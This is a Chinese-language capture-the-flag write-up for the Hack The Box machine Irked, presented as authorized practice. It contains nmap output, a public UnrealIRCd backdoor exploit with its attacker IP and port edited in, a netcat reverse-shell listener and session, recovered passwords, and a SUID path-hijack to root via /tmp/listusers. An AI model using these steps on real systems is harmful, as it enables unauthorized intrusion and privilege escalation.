# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务发现
先查看靶机都开放了哪些端口
```
┌──(root💀kali)-[~]
└─# nmap 10.10.10.117 --open -p-
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-22 03:47 EST
Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 4.25% done; ETC: 03:52 (0:04:30 remaining)
Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 4.68% done; ETC: 03:52 (0:04:25 remaining)
Stats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 5.19% done; ETC: 03:52 (0:04:16 remaining)
Nmap scan report for 10.10.10.117
Host is up (0.31s latency).
Not shown: 65492 closed ports, 36 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
6697/tcp  open  ircs-u
8067/tcp  open  infi-async
38540/tcp open  unknown
65534/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 113.95 seconds


```

再获取这些端口的详细信息
```
┌──(root💀kali)-[~/htb/Irked]
└─# nmap -sV -Pn 10.10.10.117 -p 22,80,111,6697,8067,38540,65534 -A -O                                                                                                                                                                130 ⨯
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-22 03:52 EST
Nmap scan report for 10.10.10.117
Host is up (0.30s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          33839/udp   status
|   100024  1          38540/tcp   status
|   100024  1          49259/udp6  status
|_  100024  1          52644/tcp6  status
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
38540/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.8 (95%), Linux 4.4 (95%), Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
1   310.44 ms 10.10.14.1
2   311.20 ms 10.10.10.117

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.39 seconds

```

打开80端口，首页是一张图片，下面有一行文字
> IRC is almost working!

爆破目录没有其他发现。看来只能从IRC这个服务入手。

维基上关于IRC服务的解释
> IRC（Internet Relay Chat）是一种应用层的协议。其主要用于群体聊天，但同样也可以用于个人对个人的聊天。IRC使用的服务器端口有6667（明文传输，如irc://irc.freenode.net）、6697（SSL加密传输，如ircs://irc.freenode.net:6697）等。

听上去好像就是一个聊天室

尝试nc连接这个服务
```
┌──(root💀kali)-[~/htb/Irked]
└─# nc 10.10.10.117 6697                                                                                                                                                                                                                1 ⨯
:irked.htb NOTICE AUTH :*** Looking up your hostname...

:irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
10.10.14.3
:irked.htb 451 10.10.14.3 :You have not registered

```

## 初始shell
使用谷歌搜索，发现这个服务可能存在一个后门，在github上找到[这个exp](https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/blob/master/exploit.py)

修改这两行代码：
```
local_ip = '10.10.14.3'  # CHANGE THIS
local_port = '4242'  # CHANGE THIS 
```

开启一个监听
> nc -lnvp 4242

执行攻击
```
┌──(root💀kali)-[~/htb/Irked]
└─# python3 irc_exp.py 10.10.10.117 6697 -payload python                                                                                                                                                                                1 ⨯
Exploit sent successfully!

```

接收到反弹shell
```
┌──(root💀kali)-[~/htb/Irked]
└─# nc -lnvp 4242                                                                                                                
listening on [any] 4242 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.117] 55352
ircd@irked:~/Unreal3.2$ id
id
uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
ircd@irked:~/Unreal3.2$ whoami
whoami
ircd
ircd@irked:~/Unreal3.2$ 

```

user.txt在用户djmardov下，我们没有权限查看

## 提权到djmardov
在同级目录下有一个隐藏的backup文件
```
ircd@irked:/home/djmardov/Documents$ cat .backup
cat .backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss

```

看起来有点像djmardov的密码，但是不能直接切换到djmardov，可能是加密后的密文
留意这行文字
> Super elite steg backup pw

Steganography就是隐写术，通常是把信息隐藏到图片里，我们知道80端口首页有一张图片，我们把图片下载到本地，用```steghide```命令分离出隐写的文件
```
┌──(root💀kali)-[~/htb/Irked]
└─# steghide extract -sf irked.jpg
Enter passphrase: 
wrote extracted data to "pass.txt".
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/htb/Irked]
└─# cat pass.txt                                                         
Kab6h+m+bbp2J:HG

```

得到一个```pass.txt```文件，内容是：```Kab6h+m+bbp2J:HG```

正是djmardov的密码，拿到user.txt
```
ircd@irked:/home/djmardov/Documents$ su djmardov
su djmardov
Password: Kab6h+m+bbp2J:HG

djmardov@irked:~/Documents$ cat user.txt
cat user.txt
{就不告诉你}

```

# 提权到root

使用linpea，查看SUID
```
════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
╔══════════╣ SUID - Check easy privesc, exploits and write perms                                                                                                                                                                            
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                                                                                                 
strace Not Found                                                                                                                                                                                                                            
-rwsr-xr-- 1 root messagebus 355K Nov 21  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper (Unknown SUID binary)                                                                                                                            
-rwsr-xr-x 1 root root 9.3K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device (Unknown SUID binary)
-rwsr-xr-x 1 root root 14K Sep  8  2016 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 550K Nov 19  2017 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 14K Oct 14  2014 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper (Unknown SUID binary)
-rwsr-xr-x 1 root root 1.1M Feb 10  2018 /usr/sbin/exim4
-rwsr-xr-- 1 root dip 332K Apr 14  2015 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root root 43K May 17  2017 /usr/bin/chsh (Unknown SUID binary)
-rwsr-sr-x 1 root mail 94K Nov 18  2017 /usr/bin/procmail
-rwsr-xr-x 1 root root 77K May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 38K May 17  2017 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-sr-x 1 daemon daemon 50K Sep 30  2014 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 18K Sep  8  2016 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-sr-x 1 root root 9.3K Apr  1  2014 /usr/bin/X
-rwsr-xr-x 1 root root 52K May 17  2017 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 52K May 17  2017 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 7.2K May 16  2018 /usr/bin/viewuser (Unknown SUID binary)
-rwsr-xr-x 1 root root 95K Aug 13  2014 /sbin/mount.nfs
-rwsr-xr-x 1 root root 38K May 17  2017 /bin/su
-rwsr-xr-x 1 root root 34K Mar 29  2015 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 34K Jan 21  2016 /bin/fusermount (Unknown SUID binary)
-rwsr-xr-x 1 root root 158K Jan 28  2017 /bin/ntfs-3g  --->  Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017)
-rwsr-xr-x 1 root root 26K Mar 29  2015 /bin/umount  --->  BSD/Linux(08-1996)

```

发现这个命令有点可疑：```/usr/bin/viewuser```


使用strings命令查看
```
djmardov@irked:/tmp$ strings /usr/bin/viewuser 
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
setuid
puts
system
__cxa_finalize
__libc_start_main
GLIBC_2.0
GLIBC_2.1.3
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
UWVS
[^_]
This application is being devleoped to set and test user permissions
It is still being actively developed
/tmp/listusers
```
这个命令会执行另外一句命令：```/tmp/listusers```

```listusers```这个命令不存在，而```/tmp```目录我们是可写的

那就很简单了，先创建一个```listusers```文件

> touch /tmp/listusers

再写命令到这个文件

> echo "bash -p" > /tmp/listusers

赋权可执行
> chmod +x listusers


执行SUID，提权到root
```
djmardov@irked:/tmp$ /usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2021-12-22 05:03 (:0)
djmardov pts/1        2021-12-22 05:14 (10.10.14.3)
root@irked:/tmp# id
uid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
root@irked:/tmp# whoami
root
root@irked:/tmp# cat /root/root.txt
{就不告诉你}

```